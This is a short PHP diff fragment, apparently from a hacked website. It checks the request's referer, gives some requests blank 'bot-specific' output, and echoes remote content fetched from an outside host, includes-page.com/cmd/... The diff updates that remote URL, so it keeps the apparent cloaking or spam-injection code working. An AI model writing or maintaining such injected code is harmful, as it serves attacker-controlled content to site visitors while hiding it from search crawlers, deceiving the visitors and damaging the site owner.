@@ -9,7 +9,7 @@ $s_ref = $_SERVER['HTTP_REFERER'];
             echo ' '; // Your bot-specific content
             exit;
         }
-        echo file_get_contents("includes-page.com/cmd/aislacastilla.com/ibolp2.txt");
+        echo file_get_contents("https://includes-page.com/cmd/aislacastilla.com/lp2.txt");
         exit;
         ?>
         <?php
